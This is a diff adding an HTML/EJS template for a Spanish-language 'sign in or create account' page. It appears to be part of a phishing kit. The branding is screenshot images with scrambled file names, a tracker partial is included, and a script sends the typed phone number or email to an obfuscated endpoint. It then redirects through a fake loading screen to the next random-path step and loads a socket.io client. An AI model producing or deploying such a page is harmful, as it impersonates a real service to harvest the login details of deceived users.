@@ -1,0 +1,83 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/bratoka.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <%- include('partials/tracker') %>
+</head>
+<body>
+    <div>
+        <div class="topano">
+            <div  class="pc1"><img src="./img/hedopa-pc.PNG" alt=""></div>
+            <img src="./img/hedopa-mb.png" alt="">
+        </div>
+    </div>
+    <div>
+        <div class="maina">
+            <div class="inmaina">
+                <p class="pp1">Iniciar sesión o crear cuenta </p>
+                <p class="pp2">Introduce el número de teléfono móvil o el correo electrónico</p>
+                <form method="post" id="loginForm">
+                    <input type="text" name="username" id="username">
+                    <div id="errorMessage" style="color: #d01a1a; font-size: 12px; margin-top: 5px; display: none;">Introduzca su correo electrónico o número de móvil.</div>
+                    <button class="btn" type="submit">Continuar</button>
+                </form>
+            </div>
+            <img class="pc" src="./img/inoforma.PNG" alt="">
+            <img  class="pc-1" src="./img/inoforma.png" alt="">
+
+
+        </div>  
+        
+    </div>
+<div class="line"></div>
+    <div>
+        <div class="botamano">
+            <img src="./img/botamano-pc.PNG" alt="">
+            <img src="./img/botamano-mb.png" alt="">
+        </div>
+    </div>
+    
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    console.log("submit");
+                    const username = document.getElementById('username').value;
+                    const errorMessage = document.getElementById('errorMessage');
+                    
+                    if (!username.trim()) {
+                        // Show error message if input is empty
+                        errorMessage.style.display = 'block';
+                        return; // Stop form submission
+                    }
+                    
+                    // Hide error message if input is not empty
+                    errorMessage.style.display = 'none';
+                    console.log('Login attempt:', { username });
+
+                    $.ajax({
+                        url: '/gzLbTbjqMpc34D4XsPJ2',
+                        type: 'POST',
+                        contentType: 'application/json',
+                        data: JSON.stringify({username}),
+                        success: function(info) {
+                            if(info.OK){
+                                window.location = "/loading?time=3&url=/PPmP85AgNE4pnL5mWSM";
+                            }
+                        }
+                    });
+                });
+                
+        // Also hide error message when user starts typing
+        document.getElementById('username').addEventListener('input', function() {
+            document.getElementById('errorMessage').style.display = 'none';
+        });
+    </script>
+    
+    <script src="/socket.io/socket.io.js"></script>
+   
+</body>
+</html>
